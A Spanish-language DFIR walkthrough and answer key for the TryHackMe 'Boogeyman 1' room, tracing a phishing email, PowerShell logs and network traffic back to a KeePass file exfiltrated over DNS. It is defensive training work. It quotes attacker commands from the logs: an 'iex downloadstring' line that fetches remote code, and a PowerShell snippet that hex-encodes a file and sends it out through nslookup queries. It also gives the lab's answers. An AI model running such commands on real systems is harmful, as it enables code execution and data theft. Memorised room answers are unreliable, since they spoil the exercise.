# Boogeyman 1
| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `boogeyman1` |
| **Link** | [TryHackMe](https://tryhackme.com/room/boogeyman1) |
| **Sección** | 02 Level Medium |
| **Fuente** | TryHackMe |
| **Componentes** | Análisis de email (headers/DKIM), lnkparse, PowerShell logs (JSON), Wireshark/Tshark, DNS exfiltration, KeePass, CyberChef, Seatbelt, sq3.exe |
| **Impacto** | Reconstrucción completa de una cadena de ataque (phishing → C2 → exfiltración de un archivo KeePass vía DNS) mediante análisis de email, endpoint y red. |
---
**Contexto:** Sala blue team en la que se investiga la intrusión sufrida por Julianne Westcott (Quick Logistics LLC) tras abrir un phishing de factura (B Packaging Inc.). Se analizan tres frentes: el email original, los registros PowerShell del endpoint y el tráfico de red, reconstruyendo cada TTP del atacante hasta recuperar un archivo KeePass exfiltrado con una tarjeta de crédito.
## Solucionario
### Task 1: Introduction
**Explicación:** El atacante ha comprometido la estación de trabajo de Julianne mediante un email de phishing con una factura falsa. Disponemos de tres artefactos: `dump.eml`, el volcado de logs PowerShell (`powershell.json`) y un PCAP de la red.
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Comienza la investigación con los artefactos proporcionados. | `No answer needed` |
### Task 2: Email Analysis
**Explicación:** Se examina el `dump.eml` a nivel de cabeceras y cuerpo. La dirección `From` revela al remitente (Arthur Griffin, dominio `bpakcaging.xyz`) y el campo `To` a la víctima. Las cabeceras **DKIM-Signature** y **List-Unsubscribe** exponen el servicio de retransmisión de correo de terceros (**Elastic Email**). El adjunto viene codificado en Base64 dentro del email: al decodificarlo se obtiene `Invoice.zip` (protegido con la contraseña que aparece en el cuerpo: `Invoice2023!`). Dentro del zip está el archivo `Invoice_20230103.lnk`. Con **lnkparse** se extrae el payload codificado del campo *Command Line Arguments* en Base64, que al decodificar es `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`.

```bash
cat dump.eml | grep From:
cat dump.eml | grep To:
cat attachment.txt | base64 -d > Invoice.zip
unzip Invoice.zip
lnkparse Invoice_20230103.lnk
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la dirección de email utilizada para enviar el phishing? | `agriffin@bpakcaging.xyz` |
| 2 | ¿Cuál es la dirección de email de la víctima? | `julianne.westcott@hotmail.com` |
| 3 | ¿Cuál es el nombre del servicio de retransmisión de correo de terceros usado por el atacante según las cabeceras DKIM-Signature y List-Unsubscribe? | `elasticemail` |
| 4 | ¿Cuál es el nombre del archivo dentro del adjunto cifrado? | `Invoice_20230103.lnk` |
| 5 | ¿Cuál es la contraseña del adjunto cifrado? | `Invoice2023!` |
| 6 | Según el resultado de lnkparse, ¿cuál es el payload codificado encontrado en el campo *Command Line Arguments*? | `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==` |
### Task 3: Endpoint Analysis
**Explicación:** Con el volcado de PowerShell se reconstruye la actividad del atacante en el host. Los dominios usados para alojamiento de archivos y C2 son `files.bpakcaging.xyz` y `cdn.bpakcaging.xyz`. El atacante descarga **Seatbelt** (herramienta de enumeración) desde GitHub, usa **sq3.exe** para consultar la base de datos de **Microsoft Sticky Notes** (`plum.sqlite`) y exfiltra el archivo `protected_data.kdbx` (base de datos de **KeePass**) codificado en **hex** y troceado, exfiltrándolo mediante consultas **nslookup** (DNS).

```powershell
"iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/.../Invoke-Seatbelt.ps1')"
".\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite \"SELECT * from NOTE limit 100\""
"$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination='167.71.211.113'; $bytes=[System.IO.File]::ReadAllBytes($file)"
"$hex = ($bytes|ForEach-Object ToString X2) -join ''"
"$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination }"
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué dominios usó el atacante para el alojamiento de archivos y el C2? Proporciónalos en orden alfabético. | `cdn.bpakcaging.xyz,files.bpakcaging.xyz` |
| 2 | ¿Cuál es el nombre de la herramienta de enumeración descargada por el atacante? | `seatbelt` |
| 3 | ¿Qué archivo accedió el atacante usando el binario sq3.exe? Proporciona la ruta completa con barras invertidas escapadas. | `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite` |
| 4 | ¿Qué software utiliza el archivo de la pregunta 3? | `Microsoft Sticky Notes` |
| 5 | ¿Cuál es el nombre del archivo exfiltrado? | `protected_data.kdbx` |
| 6 | ¿Qué tipo de archivo usa la extensión .kdbx? | `keepass` |
| 7 | ¿Cuál es la codificación utilizada durante el intento de exfiltración del archivo sensible? | `hex` |
| 8 | ¿Cuál es la herramienta utilizada para la exfiltración? | `nslookup` |
### Task 4: Network Analysis
**Explicación:** En Wireshark se confirma que el servidor de archivos (`files.bpakcaging.xyz`) responde con `Server: SimpleHTTP/0.6 Python/3.10.7` (respuesta: **Python**). El C2 (`cdn.bpakcaging.xyz`) usa **POST** para devolver el output de los comandos ejecutados, y el protocolo usado en la exfiltración es **DNS** (los datos hexedos viajan como subdominios de `bpakcaging.xyz`). Siguiendo el TCP stream posterior al volcado de la base de datos se obtiene la contraseña del archivo KeePass; reconstruyendo los queries DNS, separando los chunks de hex y abriendo el KDBX con KeePass se recupera la tarjeta de crédito.

```bash
tshark -r capture.pcap -Y 'dns.qry.name contains "bpakcaging.xyz"'
# Reordenar/quitar duplicados, unir el hex, "From Hex" en CyberChef, guardar como .kdbx
# Abrir con KeePass con la contraseña recuperada
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué software usa el atacante para alojar su supuesto servidor de archivos/payload? | `python` |
| 2 | ¿Qué método HTTP usa el C2 para la salida de los comandos ejecutados por el atacante? | `POST` |
| 3 | ¿Cuál es el protocolo utilizado durante la actividad de exfiltración? | `dns` |
| 4 | ¿Cuál es la contraseña del archivo exfiltrado? | `%p9^3!lL^Mz47E2GaT^y` |
| 5 | ¿Cuál es el número de tarjeta de crédito almacenado dentro del archivo exfiltrado? | `4024007128269551` |
---
**Metodología:** DFIR/blue team: análisis de email, análisis de logs de endpoint (PowerShell) y análisis de tráfico de red (Wireshark/Tshark) para reconstruir la cadena completa del ataque y los IoCs.
**Learning chain:** Análisis de cabeceras email/DKIM → parsing de LNK (lnkparse) → correlación de logs PowerShell → análisis de tráfico C2 → detección de exfiltración vía DNS → recuperación del archivo exfiltrado (KeePass).
**MITRE ATT&CK:** T1566 (Phishing), T1059.001 (PowerShell), T1082 (System Information Discovery), T1071.004 (Application Layer Protocol: DNS), T1041 (Exfiltration Over C2 Channel), T1048.003 (Exfiltration Over Alternative Protocol: DNS).
**Fuente:** [TryHackMe - Boogeyman 1](https://tryhackme.com/room/boogeyman1)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
